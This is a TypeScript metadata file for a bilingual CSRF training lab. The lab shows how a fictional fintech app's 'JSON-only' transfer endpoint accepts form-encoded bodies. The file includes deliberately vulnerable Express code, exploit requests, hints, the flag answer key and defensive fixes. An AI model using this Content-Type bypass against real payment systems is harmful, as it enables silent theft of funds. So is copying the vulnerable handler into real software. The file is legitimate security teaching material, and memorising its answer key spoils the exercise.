// src/modules/practice-labs/csrf/labs/lab2/lab2.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const csrfLab2Metadata: LabMetadata = {
  slug: 'csrf-json-api-fund-transfer-fintech',
  title: 'CSRF: JSON API Attack — Silent Fund Transfer in Fintech App',
  ar_title: 'CSRF: هجوم JSON API — تحويل أموال صامت في تطبيق مالي',
  description:
    'Exploit a CSRF vulnerability on a JSON-based API endpoint in a fintech app. The server accepts application/x-www-form-urlencoded as a fallback for JSON, allowing a classic HTML form CSRF attack to trigger money transfers.',
  ar_description:
    'استغل ثغرة CSRF في endpoint API يعتمد على JSON في تطبيق مالي. يقبل الخادم application/x-www-form-urlencoded كبديل لـ JSON، مما يسمح لهجوم HTML form الكلاسيكي بتشغيل تحويلات الأموال.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'CSRF',
    'JSON API Security',
    'Content-Type Bypass',
    'Financial Attack',
  ],
  xpReward: 240,
  pointsReward: 120,
  duration: 40,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: "Exploit the JSON transfer endpoint by sending a CSRF request using form-encoded content type. Transfer $500 from the victim's account (VICTIM-ACC) to the attacker's account (ATTACKER-ACC) without the victim's knowledge.",
  ar_goal:
    'استغل endpoint التحويل JSON بإرسال طلب CSRF باستخدام نوع محتوى form-encoded. حوّل 500$ من حساب الضحية (VICTIM-ACC) إلى حساب المهاجم (ATTACKER-ACC) دون علم الضحية.',

  briefing: {
    en: `PaySwift — fintech payment platform. Real-time transfers. Business accounts. Trusted by thousands.
"Our API is JSON-only. CSRF doesn't work on JSON endpoints — browsers can't send JSON from forms."
You hear this often.
You've learned to question it.
You look at the /transfer endpoint.
Content-Type: application/json — expected.
But you strip the Content-Type header.
Or you send: Content-Type: application/x-www-form-urlencoded.
And in the body: toAccount=ATTACKER-ACC&amount=500.
The server has a fallback parser.
It parses form-encoded just like JSON.
The "JSON-only protection" never existed.
The victim has $1000.
You want $500 of it.`,
    ar: `PaySwift — منصة دفع مالية. تحويلات فورية. حسابات تجارية. موثوقة من الآلاف.
"API لدينا JSON فقط. CSRF لا يعمل على JSON endpoints — المتصفحات لا تستطيع إرسال JSON من النماذج."
تسمع هذا كثيراً.
تعلمت التشكيك في ذلك.
تنظر إلى endpoint /transfer.
Content-Type: application/json — متوقع.
لكنك تزيل هيدر Content-Type.
أو ترسل: Content-Type: application/x-www-form-urlencoded.
وفي الـ body: toAccount=ATTACKER-ACC&amount=500.
الخادم لديه محلل احتياطي.
يحلل form-encoded تماماً مثل JSON.
"حماية JSON فقط" لم تكن موجودة أصلاً.
الضحية لديها 1000$.
تريد 500$ منها.`,
  },

  stepsOverview: {
    en: [
      'POST /transfer { "toAccount": "TEST", "amount": 1 } — confirm JSON transfer works normally',
      'Repeat with Content-Type: application/x-www-form-urlencoded and body: toAccount=TEST&amount=1 — confirm server accepts form-encoded',
      'Content-Type bypass confirmed: HTML forms can trigger this endpoint',
      "POST /csrf/simulate-victim with toAccount=ATTACKER-ACC&amount=500 — victim's session processes the transfer",
      'GET /wallet/balance — VICTIM-ACC deducted, ATTACKER-ACC credited → flag returned',
    ],
    ar: [
      'POST /transfer { "toAccount": "TEST"، "amount": 1 } — أكّد أن تحويل JSON يعمل بشكل طبيعي',
      'كرر مع Content-Type: application/x-www-form-urlencoded و body: toAccount=TEST&amount=1 — أكّد أن الخادم يقبل form-encoded',
      'تم تأكيد تجاوز Content-Type: يمكن لنماذج HTML تشغيل هذا الـ endpoint',
      'POST /csrf/simulate-victim مع toAccount=ATTACKER-ACC&amount=500 — جلسة الضحية تُعالج التحويل',
      'GET /wallet/balance — VICTIM-ACC مخصوم، ATTACKER-ACC مُضاف → يُعاد العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'PaySwift /transfer parses both application/json and application/x-www-form-urlencoded request bodies. The "JSON-only" assumption fails because developers added a form-encoded fallback parser (common in Express with body-parser). HTML forms always send form-encoded — so a classic CSRF form attack works despite the endpoint\'s intended JSON-only design.',
    vulnerableCode:
      '// Transfer endpoint (vulnerable):\n' +
      "app.post('/transfer', isAuthenticated, async (req, res) => {\n" +
      '  // ❌ Accepts both JSON and form-encoded (Content-Type bypass)\n' +
      '  const { toAccount, amount } = req.body;\n' +
      '  // ❌ No CSRF token check\n' +
      '  await db.transfers.create({ from: req.user.id, to: toAccount, amount });\n' +
      '  res.json({ success: true });\n' +
      '});',
    exploitation:
      'POST /csrf/simulate-victim { "targetPath": "/transfer", "contentType": "form", "body": { "toAccount": "ATTACKER-ACC", "amount": 500 } } → victim\'s session processes transfer → VICTIM-ACC: $500, ATTACKER-ACC: $550',
    steps: {
      en: [
        'POST /transfer with Content-Type: application/x-www-form-urlencoded, body: toAccount=ATTACKER-ACC&amount=1 → server returns 200 ✓ — form-encoded accepted',
        'POST /csrf/simulate-victim { "targetPath": "/transfer", "body": { "toAccount": "ATTACKER-ACC", "amount": 500 } }',
        'GET /wallet/balance → VICTIM-ACC: $500 (was $1000), ATTACKER-ACC: $550 (was $50)',
        'Flag returned: FLAG{CSRF_JSON_API_CONTENT_TYPE_BYPASS_FUND_TRANSFER}',
      ],
      ar: [
        'POST /transfer مع Content-Type: application/x-www-form-urlencoded، body: toAccount=ATTACKER-ACC&amount=1 → الخادم يُعيد 200 ✓ — form-encoded مقبول',
        'POST /csrf/simulate-victim { "targetPath": "/transfer"، "body": { "toAccount": "ATTACKER-ACC"، "amount": 500 } }',
        'GET /wallet/balance → VICTIM-ACC: 500$ (كانت 1000$)، ATTACKER-ACC: 550$ (كانت 50$)',
        'العلم مُعاد: FLAG{CSRF_JSON_API_CONTENT_TYPE_BYPASS_FUND_TRANSFER}',
      ],
    },
    fix: [
      "Enforce Content-Type strictly: reject any request to /transfer that is not Content-Type: application/json — don't add form-encoded parsers to sensitive endpoints",
      "CSRF tokens: include X-CSRF-Token header (which HTML forms can't set cross-origin) and validate server-side",
      'Custom headers as CSRF defense: require a custom header like X-Requested-With: XMLHttpRequest — HTML forms cannot set custom headers',
      "SameSite=Strict on session cookies: browser won't send cookies on cross-site POST",
    ],
  },

  postSolve: {
    explanation: {
      en: 'The "JSON-only" CSRF defense is a myth when the server has a form-encoded fallback parser. Browsers can only send three content types in simple cross-origin requests: application/x-www-form-urlencoded, multipart/form-data, and text/plain. If any of these are accepted by the server, classic CSRF applies. The real protection is not the content type — it\'s the CSRF token or SameSite cookie attribute.',
      ar: '"حماية JSON فقط" من CSRF هي أسطورة عندما يمتلك الخادم محللاً احتياطياً لـ form-encoded. يمكن للمتصفحات فقط إرسال ثلاثة أنواع محتوى في الطلبات البسيطة عبر الأصول: application/x-www-form-urlencoded و multipart/form-data و text/plain. إذا قبل الخادم أياً منها، ينطبق CSRF الكلاسيكي. الحماية الحقيقية ليست نوع المحتوى — إنها CSRF token أو خاصية SameSite للكوكي.',
    },
    impact: {
      en: "Silent fund transfer: $500 taken from the victim's account in a single page visit — no login required from the attacker, no credentials stolen, no malware. In real-world fintech, CSRF on payment endpoints has led to millions in losses. The attack is completely invisible to the victim (the form auto-submits in a hidden iframe).",
      ar: 'تحويل أموال صامت: 500$ مأخوذة من حساب الضحية في زيارة صفحة واحدة — لا يُشترط تسجيل دخول من المهاجم، لا بيانات اعتماد مسروقة، لا برامج ضارة. في fintech العالم الحقيقي، أدى CSRF على نقاط نهاية الدفع إلى خسائر بالملايين. الهجوم غير مرئي تماماً للضحية (يُرسَل النموذج تلقائياً في iframe مخفي).',
    },
    fix: [
      'Never add form-encoded parsers to payment/transfer endpoints — strictly enforce application/json only',
      'Require custom headers (X-CSRF-Token, X-Requested-With) — cross-origin HTML forms cannot set these',
      'Financial transaction confirmation: require PIN or 2FA for any fund transfer regardless of CSRF protections',
      'Transaction limits + anomaly detection: even if CSRF succeeds, flag unusual transfer patterns',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'The /transfer endpoint is advertised as JSON-only. But what happens if you send the same request with Content-Type: application/x-www-form-urlencoded? Does the server reject it?',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'POST /transfer with Content-Type: application/x-www-form-urlencoded and body: toAccount=ATTACKER-ACC&amount=1. If the server returns 200 OK — the JSON-only protection is a myth.',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'Use /csrf/simulate-victim to trigger the attack as the victim. Pass: { "targetPath": "/transfer", "body": { "toAccount": "ATTACKER-ACC", "amount": 500 } }. Check /wallet/balance after.',
    },
  ],

  flagAnswer: 'FLAG{CSRF_JSON_API_CONTENT_TYPE_BYPASS_FUND_TRANSFER}',
  initialState: {
    users: [
      {
        username: 'victim_charlie',
        password: 'charlie123',
        role: 'user',
        email: 'charlie@payswift.io',
      },
      {
        username: 'attacker_dave',
        password: 'dave123',
        role: 'user',
        email: 'dave@payswift.io',
      },
    ],
    banks: [
      { accountNo: 'VICTIM-ACC', balance: 1000, ownerName: 'Charlie (Victim)' },
      { accountNo: 'ATTACKER-ACC', balance: 50, ownerName: 'Dave (Attacker)' },
    ],
  },
};
